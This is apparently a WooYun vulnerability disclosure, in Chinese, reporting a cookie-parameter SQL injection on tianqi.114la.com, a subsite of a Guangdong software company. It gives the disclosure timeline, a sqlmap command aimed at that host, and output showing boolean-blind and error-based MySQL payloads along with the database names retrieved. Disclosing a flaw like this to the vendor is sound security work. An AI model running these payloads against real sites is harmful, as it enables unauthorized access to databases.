wybug_title: 雨林木风旗下某分站SQL注入
wybug_corp: 广东雨林木风计算机科技有限公司
wybug_detail:
漏洞详情 披露状态：   									2014-01-05：	细节已通知厂商并且等待厂商处理中									2014-01-05：	厂商已经确认，细节仅向厂商公开									2014-01-15：	细节向核心白帽子及相关领域专家公开									2014-01-25：	细节向普通白帽子公开									2014-02-04：	细节向实习白帽子公开									2014-02-19：	细节向公众公开  简要描述： cookie注入一枚 详细说明：  注入点:http://tianqi.114la.comcookie参数19f97db8a921d05fd73254b5f23660ea存在注入通知存在注入点，未做进一步测试！
python sqlmap.py -u "http://tianqi.114la.com" --cookie="19f97db8a921d05fd73254b5f23660ea=456" --level=2  --dbs --batch --flush-sessionCookie parameter '19f97db8a921d05fd73254b5f23660ea' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection points with a total of 266 HTTP(s) requests:---Place: CookieParameter: 19f97db8a921d05fd73254b5f23660ea    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: 19f97db8a921d05fd73254b5f23660ea=456 AND 5828=5828    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: 19f97db8a921d05fd73254b5f23660ea=456 AND (SELECT 2343 FROM(SELECT COUNT(*),CONCAT(0x7163687271,(SELECT (CASE WHEN (2343=2343) THEN 1 ELSE 0 END)),0x7175706f71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)---[15:39:35] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0[15:39:35] [INFO] fetching database names[15:39:35] [INFO] the SQL query used returns 3 entries[15:39:35] [INFO] retrieved: information_schema[15:39:35] [INFO] retrieved: 114la_app[15:39:35] [INFO] retrieved: testavailable databases [3]:[*] 114la_app[*] information_schema[*] test
